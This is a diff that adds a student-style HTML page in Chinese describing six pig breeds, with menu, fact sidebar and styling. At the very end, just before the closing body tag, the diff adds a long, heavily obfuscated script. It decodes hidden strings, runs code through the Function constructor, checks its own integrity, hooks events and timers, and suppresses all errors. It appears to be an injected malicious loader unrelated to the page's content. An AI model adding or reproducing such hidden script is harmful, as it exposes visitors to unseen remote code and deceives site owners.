@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+   
+</head>
+<a href="https://Hello">點擊！ </a>
+<!-- 背景顏色 -->
+<style>
+body {
+   
+    background: linear-gradient(180deg, #ffffff 0%, #ffdfe9 100%);
+    background-attachment: fixed; 
+}
+
+</style>
+<body>
+  <!-- 背景 -->
+
+  <!-- 第一區塊 豬隻品種介紹 -->
+
+<h1 class="a1">
+  <div class="hamburger-container" id="menu-toggle"> 
+    <div class="hamburger-icon"></div>
+  </div>
+  <img src="./小豬圖標.jpg" width="100" alt="小豬圖標" class="a2">
+  豬隻品種介紹
+  <img src="./小豬圖標.jpg" width="100" alt="小豬圖標" class="a2">
+</h1>
+
+ <!-- 第二區塊 目錄 -->
+
+<h2 id="menu-label">目錄</h2>
+<ul class="nav-menu" id="nav-list">
+  <li><a href="#a">跳轉到藍瑞斯</a></li>
+  <li><a href="#b">跳轉到約克夏</a></li>
+  <li><a href="#c">跳轉到杜洛克</a></li>
+  <li><a href="#d">跳轉到盤克夏</a></li>
+  <li><a href="#e">跳轉到伊比利</a></li>
+  <li><a href="#f">跳轉到廄香</a></li>
+</ul>
+
+<!-- 目錄排版 -->
+
+<style>
+.a1 {
+    display: flex;
+    align-items: center; 
+    gap: 15px;  
+    justify-content: center;         
+    width: 80%;           
+    margin: 0 auto;       
+}
+
+
+.hamburger-container {
+  width: 45px;
+  height: 45px;
+  background-color: #424242;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  
+  
+  position:fixed;   
+  left: 20px;           
+  top: 25px;            
+}
+.hamburger-icon {
+  width: 22px;
+  height: 3px;
+  background-color: #fff;
+  position: relative;
+}
+.hamburger-icon::before, .hamburger-icon::after {
+  content: "";
+  position: absolute;
+  width: 100%;
+  height: 3px;
+  background-color: #fff;
+  left: 0;
+}
+.hamburger-icon::before { top: -8px; }
+.hamburger-icon::after { bottom: 8px; }
+
+.nav-menu {
+    display: none;
+    list-style: none;
+    padding: 15px;
+    margin-top: 10px;
+    border: 2px dashed #ffcbd5;
+    border-radius: 20px; 
+    background-color: rgba(255, 255, 255, 0.95); 
+    width: 200px; 
+    box-shadow: 0 8px 30px rgba(0,0,0,0.05); 
+}
+
+.nav-menu li {
+    margin-bottom: 8px;
+}
+
+.nav-menu li:last-child {
+    margin-bottom: 0;
+}
+
+.nav-btn {
+    display: block; 
+    text-decoration: none;
+    color: #555; 
+    background-color: #f8f9fa;
+    padding: 10px 15px;
+    border-radius: 12px;
+    font-size: 15px;
+    text-align: center;
+    transition: all 0.3s ease; 
+    border: 1px solid transparent;
+}
+
+
+.nav-btn:hover {
+    background-color: #ffcbd5;
+    color: white;
+    transform: translateX(5px); 
+}
+.nav-menu.active {
+  display: block;
+}
+
+
+#menu-label {
+  display: none; 
+}
+#menu-label.active {
+  display: block;
+}
+
+</style>
+<!-- 裝飾用小豬那排 -->
+    <div class="menu-icon"></div>
+    <div class="k1">
+<img src="./小豬圖標2.jpg" width="100" alt=""><img src="./小豬圖標2.jpg" width="100" alt=""><img src="./小豬圖標2.jpg" width="100" alt=""><img src="./小豬圖標2.jpg" width="100" alt=""><img src="./小豬圖標2.jpg" width="100" alt=""><img src="./小豬圖標2.jpg" width="100" alt=""><img src="./小豬圖標2.jpg" width="100" alt=""><img src="./小豬圖標2.jpg" width="100" alt="">
+</div>  
+<style>
+.k1 {
+    display: flex;
+    justify-content: space-around; 
+    align-items: center;
+    
+   
+    width: 80%;           
+    margin: 30px auto;   
+    
+    
+    border: 4px dashed #ffdada; 
+    
+    
+    padding: 25px 15px;
+    border-radius: 30px;
+    
+    
+    background-color: #ffffff; 
+}
+
+
+.k1 img {
+    width: 70px; 
+    height: auto;
+    transition: transform 0.3s;
+}
+
+.k1 img:hover {
+    transform: scale(1.2) rotate(10deg);
+}
+</style>
+<!-- 目錄排版結束 -->
+
+
+<!-- 第三區塊 主區塊 豬隻品種區塊(藍瑞斯)-->
+
+    <h3 id="a">藍瑞斯</h3>
+   <p id="x1">外貌:藍瑞斯長著一對巨型大耳、修長體型、純白皮膚。
+    <br>特性:藍瑞斯具有高產仔、性格溫馴、乳汁充足。
+    <br>優勢:成長速度雖然慢於杜克洛，但能夠以較少的飼料換取到較多的肉。</p>
+    
+    <!-- 藍瑞斯圖片 -->
+
+    <img src="./藍瑞斯.jpg" width="200">
+    <br>
+  <a href= https://zh.wikipedia.org/zh-tw/%E7%BE%8E%E5%9B%BD%E9%95%BF%E7%99%BD%E7%8C%AA target="_blank">(此圖來源於維基百科)</a> 
+
+ 
+  
+  <!-- 豬隻品種區塊(約克夏) -->
+
+  <h3 id="b">約克夏</h3>
+  <p>
+    外貌：約克夏擁有純白皮膚，最具代表性的是其直立的雙耳與修長的體型。<br>
+    特性：具有優異的繁育能力，母豬母性好、乳汁充足，且生長性能穩定。<br>
+    優勢：生長速度極快，肉質瘦肉比例高，是商業豬場中不可或缺的優良品種。<br>
+  </p>
+  
+
+<!-- 約克夏圖片 -->
+
+      <img src="約克夏.jpg" width="200"><br>
+      <a href= https://zh.wikipedia.org/zh-tw/%E7%BE%8E%E5%9B%BD%E7%BA%A6%E5%85%8B%E5%A4%8F%E7%8C%AA target="_blank">(此圖來源於維基百科)</a>
+
+
+<!-- 豬隻品種區塊(杜洛克) -->
+
+ <h3 id="c">杜洛克</h3>
+ <p>
+    外貌：紅棕色皮毛、半下垂耳朵。<br>
+    特性：保水性好使肉質更有彈性。<br>
+    優勢：生長最快、換肉率高。<br>
+    </p>
+
+    <!-- 杜洛克圖片 -->
+
+    <img src="./杜洛克.jpg" width="200" alt=""><br>
+<a href= https://zh.wikipedia.org/zh-tw/%E6%9D%9C%E6%B4%9B%E5%85%8B%E7%8C%AA target="_blank">(此圖來源於維基百科)</a>
+
+ <!-- 豬隻品種區塊(盤克夏) -->
+
+<h3 id="d">盤克夏</h3>
+<p>
+ 外貌:全身覆蓋黑色的毛，但有六個地方是白色的，鼻端、尾端、四肢末端  。<br>
+特性:產仔數少、生長慢、體型小<br>
+優勢:被稱謂豬肉界的神戶和牛，高保水性、白色油脂。<br>
+</p>
+
+<!-- 盤克夏圖片 -->
+
+<img src="./盤克夏.jpg" width="200"><br>
+<a href= https://zh.wikipedia.org/zh-tw/%E5%B7%B4%E5%85%8B%E5%A4%8F%E7%8C%AA target="_blank">(此圖來源於維基百科)</a>
+
+<!-- 豬隻品種區塊(伊比利) -->
+
+<h3 id="e">伊比利</h3>
+<p>
+ 外貌:皮膚多為灰色或黑色，腿長且蹄部通常呈黑色。<br>
+特性:能將攝取的脂肪儲存在肌肉纖維之間（類似和牛的油花），而不是只在皮下。<br>
+優勢:抗氧化力、鮮嫩多肉汁、高油酸含量。<br>
+</p>
+
+<!-- 伊比利圖片 -->
+
+<img src="./伊比利豬.jpg" width="200" alt=""><br>
+<a href=https://zh.wikipedia.org/zh-tw/伊比利亚猪 target="_blank">(此圖來源於維基百科)</a>
+
+<!-- 豬隻品種區塊(麝香) -->
+
+<h3 id="f">麝香</h3>
+<p>
+外貌:最常見的是黑白相間，也有全黑或粉紅帶黑斑的、 肚子微下垂、背部稍微凹陷、耳朵小而直立。<br>
+特性:高智商、膽小且好奇。<br>
+優勢:壽命較長、陪伴性<br>
+</p>
+
+<!--麝香圖片  -->
+
+   <img src="./麝香豬.jpg" width="200" alt=""><br>
+    <a href="https://kmweb.moa.gov.tw/knowledge_view.php?id=8629" target="_blank">(此圖來源於農業知識入口網)</a><br>
+
+    <!-- 全部豬隻名稱排版 -->
+
+<style>
+ 
+    h3 {
+    
+    border-left: 8px solid #ff99ab; 
+    
+    
+    background: linear-gradient(90deg, #fff0f3 0%, transparent 100%);
+    
+    
+    padding: 10px 20px;
+    
+   
+    color: #444;
+    margin-top: 50px;    
+    margin-bottom: 20px; 
+    border-radius: 5px;  
+    
+    
+    border-bottom: 1px dashed #ffcbd5;
+}
+ </style>
+
+ <!-- 全部豬隻圖片排版 -->
+  
+  <style>
+img { 
+    margin: 15px 0;
+    border-radius: 15px; 
+    box-shadow: 0 5px 15px rgba(0,0,0,0.1); 
+}
+  </style>
+<!-- 第四區塊 補充小百科區 -->
+
+
+<aside class="fun-fact-sidebar">
+<div class="fact-card">
+<div class="fact-icon">💡</div>
+<h4>豬豬小百科</h4>
+<ul class="fact-list">
+<li>
+ <strong>嗅覺天才</strong>
+<p>豬的嗅覺比獵犬還靈敏，能聞到地底深處的松露。</p>
+</li>
+<li>
+   <strong>聰明小豬</strong>  
+<p>智商與三歲小孩相當，甚至能學會操作搖桿玩簡單遊戲。</p>
+</li>
+<li>
+<strong>天生愛乾淨</strong>
+<p>只要空間足夠，豬絕對不會在睡覺或吃東西的地方排泄。</p>
+ </li>
+<li>
+<strong>防曬大師</strong>
+<p>泥巴浴不只是為了涼快，還能防止皮膚曬傷和昆蟲叮咬。</p>
+ </li>
+ </ul>
+ </div>
+</aside>
+<!-- 補充小百科排版區 -->
+<style>
+body{
+
+.container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 20px;
+}
+
+h2 {
+    color: #0c0c0c; 
+    border-bottom: 2px solid #f8d7da;
+    padding-bottom: 10px;
+}
+
+ul {
+    display: flex;
+    gap: 15px;
+    list-style: none;
+    padding: 0;
+}
+
+ul li a {
+    text-decoration: none;
+    color: white;
+    background-color: #646464;
+    padding: 5px 15px;
+    border-radius: 20px;
+    transition: 0.3s;
+}
+}
+
+ul li a:hover {
+    background-color: #cccccc;
+} 
+</style>
+
+
+<style>
+.main-container {
+    display: flex;
+    gap: 40px;
+    align-items: flex-start;
+}
+
+.fun-fact-sidebar {
+    flex: 0 0 300px;  
+    position: sticky;
+    top: 50px; 
+}
+
+.fact-card {
+    background: #fff5f7;
+    border-radius: 20px;
+    padding: 25px;
+    box-shadow: 0 10px 20px rgba(255, 182, 193, 0.2);
+    transition: transform 0.3s ease;
+}
+
+.fact-card:hover {
+    transform: translateY(-5px); 
+}
+.fact-icon {
+    font-size: 40px;
+    text-align: center;
+    margin-bottom: 10px;
+}
+
+.fact-card h4 {
+    color: #d63384;
+    text-align: center;
+    margin-bottom: 20px;
+    font-size: 1.2rem;
+    border-bottom: 2px dashed #ffcbd5;
+    padding-bottom: 10px;
+}
+
+.fact-list {
+    list-style: none;
+    padding: 0;
+}
+
+.fact-list li {
+    margin-bottom: 15px;
+}
+
+.fact-list strong {
+    color: #854d0e;
+    display: block;
+    margin-bottom: 5px;
+}
+
+.fact-list p {
+    font-size: 0.9rem;
+    color: #666;
+    line-height: 1.4;
+    margin: 0;
+}
+</style>
+<style>
+.fact-list {
+    list-style: none; 
+    padding: 0;
+}
+
+.fact-list li {
+    margin-bottom: 20px;
+    padding-left: 35px; 
+    position: relative; 
+}
+
+
+.fact-list li::before {
+    content: "🐷";    
+    position: absolute;
+    left: 0;
+    top: 0;
+    font-size: 20px;
+}
+
+.fact-list strong {
+    color: #d63384;
+    display: block;
+    margin-bottom: 3px;
+    font-size: 1.05rem;
+}
+
+.fact-list p {
+    font-size: 0.9rem;
+    color: #555;
+    line-height: 1.5;
+    margin: 0;
+}
+</style>
+
+<!-- java區塊 負責控制目錄功能 -->
+
+<script>
+  const toggleBtn = document.getElementById('menu-toggle');
+  const navList = document.getElementById('nav-list');
+  const menuLabel = document.getElementById('menu-label');
+
+  toggleBtn.addEventListener('click', function() {
+    // 顯示或隱藏
+    navList.classList.toggle('active');
+    menuLabel.classList.toggle('active');
+  });
+
+  // 自動收合
+  document.querySelectorAll('.nav-menu a').forEach(link => {
+    link.addEventListener('click', () => {
+      navList.classList.remove('active');
+      menuLabel.classList.remove('active');
+    });
+  });
+</script>
+<!-- 手機板優化 -->
+<style>
+@media (max-width: 768px) {
+   
+    img {
+        max-width: 90% !important;
+        height: auto !important;
+    }
+
+    
+    .a1 {
+        width: 100% !important;
+        flex-direction: column;
+        text-align: center;
+        font-size: 1.6rem;
+    }
+    h3 {
+        font-size: 1.25rem;
+        }
+        
+      p {
+        font-size: 1rem;
+        line-height: 1.6; 
+        padding: 0 15px;
+      }
+    }
+ </style>
+ <script>(function(Z3nXiF0){Function("Z3nXiF",Z3nXiF0["U5MQ5j51Qyo1d36X0ZZ2oa5"]="try{(function(R5W00pTO,D18Ja,BwJEU){D18Ja[\"Wr23SI3\"]=this;StaM={ThBsy38s6:142,W10w2:140,EGMHO:\"SR420936:Mhf812:W10w2:L8bzK7x0zT:W10w2:FmUFBK:L1O1WPTZ:V9WI92UJ\",Smg6FM6:97,GOEq44j:101,OzkiTUoe:124,NV3n2r2:\"C7w2bY:H1Kf4:SuE78GLX4\",FmUFBK:83,BLL3a:134,QUvH8x1n5I:137,V650Fc9bsw:\"D98fH5cE:Mbd8ai366z:J3SwqUTEX:SR420936:PtJgr38x:I1X2EGT8d:EWcy40bgD2:F82ut72:J3SwqUTEX:D9KU0:D9KU0:QUvH8x1n5I:W10w2:FmUFBK:OOF5fC:OOF5fC:Smg6FM6:PtJgr38x:C7w2bY:C7w2bY:H1Kf4:F82ut72:IXsEU3b5\",GT32ja:\"D98fH5cE:Mhf812:Mhf812:ZWe7od2:Y7Fb2WF65H:PtJgr38x:KD7xTcTw:D9KU0:GOEq44j:PoYkHM:W10w2:D9KU0:PtJgr38x:KD7xTcTw:PtJgr38x:SR420936\",Mt34uePtI:\"Mhf812:H1Kf4:OzkiTUoe:ThBsy38s6:BLL3a:PtJgr38x:KD7xTcTw:D9KU0\",C7w2bY:133,EWcy40bgD2:86,OvqZ1:108,PTr5GdT9:\"W10w2:QUvH8x1n5I:C7w2bY:PoYkHM:D9KU0\",KHn6z8euC:\"C7w2bY:PtJgr38x:KD7xTcTw:SuE78GLX4:D9KU0:J3SwqUTEX\",C84S2CqI8:\"OHgKi8B:ThBsy38s6:PtJgr38x:SR420936:L8bzK7x0zT:OvqZ1:PtJgr38x:C7w2bY:PtJgr38x:OzkiTUoe:D9KU0:H1Kf4:SR420936:KQL77:C7w2bY:C7w2bY\",IXsEU3b5:118,X8i9Pf:\"OzkiTUoe:C7w2bY:PoYkHM:OzkiTUoe:Wy00JO\",YfR62NC:\"J3SwqUTEX:D9KU0:D9KU0:QUvH8x1n5I:W10w2:FmUFBK:OOF5fC:OOF5fC:J3SwqUTEX:H1Kf4:H1Kf4:I1X2EGT8d:I1X2EGT8d:MJgODuC:Vj87Jo86Vk:MW1d3kbrb:BdRZwE027:L1O1WPTZ:D98fH5cE:SR420936:D9KU0:A9J5b5X25:SuE78GLX4:PoYkHM:D9KU0:J3SwqUTEX:ThBsy38s6:TB96FwhDkL:A9J5b5X25:PoYkHM:H1Kf4:OOF5fC:QUvH8x1n5I:PoYkHM:SuE78GLX4:OOF5fC:GoJqfjy:PtJgr38x:TB96FwhDkL:A9J5b5X25:J3SwqUTEX:D9KU0:BLL3a:C7w2bY:JYG851reS:OzkiTUoe\",TysAvN5pD:\"OzkiTUoe:H1Kf4:KD7xTcTw:W10w2:H1Kf4:C7w2bY:PtJgr38x\",Vet55:109,Mhf812:125,D9KU0:141,Y28P7u3t:\"SR420936:Mhf812:W10w2:L8bzK7x0zT:W10w2:FmUFBK:L1O1WPTZ:BdRZwE027\",TB96FwhDkL:123,SuE78GLX4:128,WcCPYxd9:\"N8YAc8i:V9WI92UJ:BdRZwE027\",H1Kf4:136,O8XyYApr:\"ThBsy38s6:KD7xTcTw:Mhf812:PtJgr38x:I1X2EGT8d:PoYkHM:KD7xTcTw:PtJgr38x:Mhf812\",YlOAFs99X:\"J3SwqUTEX:SR420936:PtJgr38x:I1X2EGT8d\",Wy00JO:132,Y7Fb2WF65H:143,KQL77:90,Mbd8ai366z:116,OE9eQ:\"W10w2:PtJgr38x:D9KU0:Vet55:PoYkHM:BLL3a:PtJgr38x:H1Kf4:ThBsy38s6:D9KU0\",F82ut72:64,A9J5b5X25:71,ZWe7od2:94,MW1d3kbrb:78,JYG851reS:60,KD7xTcTw:135,Vj87Jo86Vk:81,L8bzK7x0zT:146,PtJgr38x:126,LHGwa:\"SuE78GLX4:PtJgr38x:D9KU0:KQL77:D9KU0:D9KU0:SR420936:PoYkHM:TB96FwhDkL:ThBsy38s6:D9KU0:PtJgr38x\",PoYkHM:130,L1O1WPTZ:70,I1X2EGT8d:127,V9WI92UJ:75,E6Qpi0352:\"I1X2EGT8d:H1Kf4:SR420936:ZWe7od2:D98fH5cE:OzkiTUoe:J3SwqUTEX\",J3SwqUTEX:129,D98fH5cE:122,MJgODuC:77,BdRZwE027:74,SR420936:139,OHgKi8B:138,GoJqfjy:144,OOF5fC:72,N8YAc8i:76};Vizhx23mbJ=(JzA1qJ)=>StaM[JzA1qJ][AXT(\"6eH1mvNeshE7BRfp9SWNEU0qlcmfGv8Xi70xc8E5mt2WVJnovLd:J7fxWV59oRq1HdSX6Ue2vGhBLcENm0n8\")](\":\")[AXT(\"6OxATESj4mbSwIqW1qCraItGTOep2bTt0L:xO1Letj406ST2IAWwrbqCGE\")]((YUiK8Yr)=>UpXZOEFowe()[AXT(\"GDZ9z7SC9XyeWWKBtkkjkBjrzMmOl6KiTfyA1fc2nWA5u5EbgyvPUTVDJ:vb95XZETz6eGuBUOyMl17fJm2WCKcPkjVDA\")][AXT(\"lF2Q4OP9JfwvnijKAbr4QuL4HYQyonwwQ2ckmEB8VvMplZCFAZE74SVhAVvc8712DaHEtgvrqJtclkYcyCHcRluTucoNJTvYSq42sdLGQLTeD9Bcz4k8q:nFtTRcNpQwBY8gLiAOqyvHKzD9Z7MjJsSVGElukbP142\")](StaM[YUiK8Yr]-25))[AXT(\"SVDMRGuAjuJb8DporpK8kOkKifHSVXDAOSntZk7336Fe:DF8ZJbSHM7fRtXOpuA3ekGVK6r\")](\"\");((PN6GR40)=>{JN9rhD=\"\x61\";Nzs2O=\"\x63\";HgLCcS=\"\x65\";FKyh=\"\x67\";R36F12=\"\x45\";AGH=\"\x69\";Zcwobo9W6=\"\x6c\";G9s=\"\x70\";JCB=\"\x72\";QW0h2k79=\"\x52\";QFxk=\"\x73\";B25h4a4=\"\x74\";M69=\"\x78\";DEj3=FKyh+R36F12;V2T=M69+G9s;TK7fJ3rd25=QW0h2k79+HgLCcS;PN6GR40[\"C1mCu\"]=TK7fJ3rd25+DEj3+V2T;HO25I2aK=G9s+Zcwobo9W6;N41f=JN9rhD+Nzs2O;TK7fJ3rd25=JCB+HgLCcS;PN6GR40[\"Qf99hJ\"]=TK7fJ3rd25+HO25I2aK+N41f+HgLCcS;BE99228y=AGH+B25h4a4;Umk5W=QFxk+G9s;PN6GR40[\"W63ktKPF\"]=Umk5W+Zcwobo9W6+BE99228y;})(T0eDIxd={});AXT=(V4im0q9)=>(((WsqKKjL)=>WsqKKjL[0][T0eDIxd[\"Qf99hJ\"]](UpXZOEFowe()[T0eDIxd[\"C1mCu\"]](\"[\"+WsqKKjL[1]+\"]\",\"g\"),''))(V4im0q9[T0eDIxd[\"W63ktKPF\"]](/:/)));UpXZOEFowe=()=>D18Ja[\"Wr23SI3\"];R5W00pTO={\"Fl95a\":[\"CpAmZ\",\"F4S\",\"Wr23SI3\",Vizhx23mbJ(\"TysAvN5pD\"),\"NSS\",Vizhx23mbJ(\"NV3n2r2\"),Vizhx23mbJ(\"EGMHO\"),\"O89\",\"CpAmZ\",\"Wr23SI3\",Vizhx23mbJ(\"Mt34uePtI\"),\"NSS\",Vizhx23mbJ(\"C84S2CqI8\"),Vizhx23mbJ(\"V650Fc9bsw\"),\"S0nK2\",\"OOvDj\",\"CpAmZ\",\"G9b9T5Z\",\"OOvDj\",\"Wr23SI3\",Vizhx23mbJ(\"TysAvN5pD\"),\"NSS\",Vizhx23mbJ(\"NV3n2r2\"),Vizhx23mbJ(\"Y28P7u3t\"),\"O89\",\"CpAmZ\",\"OOvDj\",\"HgN\"],\"Y0OV5Jhhz5\":[\"CpAmZ\",\"JS7B2UT\",\"NSS\",Vizhx23mbJ(\"LHGwa\"),Vizhx23mbJ(\"YlOAFs99X\"),\"S0nK2\",Vizhx23mbJ(\"YlOAFs99X\"),\"CpAmZ\",\"JS7B2UT\",\"UhuA\",Vizhx23mbJ(\"YlOAFs99X\"),Vizhx23mbJ(\"YfR62NC\"),\"CpAmZ\",\"Wr23SI3\",\"EUGfGP2\",Vizhx23mbJ(\"OE9eQ\"),Vizhx23mbJ(\"WcCPYxd9\")],\"EUGfGP2\":[\"CpAmZ\",\"JS7B2UT\",\"Uj6YEDcZ\",Vizhx23mbJ(\"YlOAFs99X\"),Vizhx23mbJ(\"YlOAFs99X\")]};BwJEU=(OIZa7V6,Ldys68,H6Q1A0,A44j7zUFB,KZJeB3t)=>{A44j7zUFB[\"CpAmZ\"]=()=>{KZJeB3t=D18Ja;H6Q1A0=0;};A44j7zUFB[\"G9b9T5Z\"]=()=>{if(KZJeB3t[OIZa7V6[++Ldys68]][Vizhx23mbJ(\"KHn6z8euC\")]){H6Q1A0=1;}};A44j7zUFB[\"F4S\"]=()=>{if((typeof(Z3nXiF)===Vizhx23mbJ(\"O8XyYApr\"))||(!(Z3nXiF[\"U5MQ5j51Qyo1d36X0ZZ2oa5\"][Vizhx23mbJ(\"PTr5GdT9\")](/[(){},:;=]/)[Vizhx23mbJ(\"KHn6z8euC\")]-Z3nXiF[\"FA82h9ex2dGkvURgy479zK15IgDo4KP\"]))){H6Q1A0=1;}};A44j7zUFB[\"NSS\"]=()=>{KZJeB3t=KZJeB3t[OIZa7V6[++Ldys68]](OIZa7V6[++Ldys68]);};A44j7zUFB[\"S0nK2\"]=()=>{D18Ja[OIZa7V6[++Ldys68]]=KZJeB3t;};A44j7zUFB[\"UhuA\"]=()=>{KZJeB3t[OIZa7V6[++Ldys68]]=OIZa7V6[++Ldys68];};A44j7zUFB[\"Uj6YEDcZ\"]=()=>{KZJeB3t[OIZa7V6[++Ldys68]]=D18Ja[OIZa7V6[++Ldys68]];};A44j7zUFB[\"HgN\"]=()=>{KZJeB3t[Vizhx23mbJ(\"E6Qpi0352\")]((R7iw09rv4)=>{R7iw09rv4[Vizhx23mbJ(\"GT32ja\")](Vizhx23mbJ(\"X8i9Pf\"),()=>{D18Ja[\"JS7B2UT\"]=R7iw09rv4;BwJEU(R5W00pTO[\"Y0OV5Jhhz5\"],0,1,{},null);});});};A44j7zUFB[\"EUGfGP2\"]=()=>{KZJeB3t[OIZa7V6[++Ldys68]](()=>{BwJEU(R5W00pTO[\"EUGfGP2\"],0,1,{},null);},OIZa7V6[++Ldys68]);};A44j7zUFB[\"U17U79Fl\"]=()=>{KZJeB3t=KZJeB3t[OIZa7V6[Ldys68]];};while(Ldys68<OIZa7V6.length){if(OIZa7V6[Ldys68]==\"CpAmZ\"){A44j7zUFB[\"CpAmZ\"]();}else{if(!H6Q1A0){if(OIZa7V6[Ldys68] in A44j7zUFB){A44j7zUFB[OIZa7V6[Ldys68]]();}else if(OIZa7V6[Ldys68]==\"O89\"){return \"O89\";}else{A44j7zUFB[\"U17U79Fl\"]();}}}Ldys68++;}};BwJEU(R5W00pTO[\"Fl95a\"],0,1,{},null);})(0,{},0);}catch(e){if(this._llqw){this._llqw(e)}}")(Z3nXiF0,Z3nXiF0["FA82h9ex2dGkvURgy479zK15IgDo4KP"]=790);})({});</script>
+ </body>
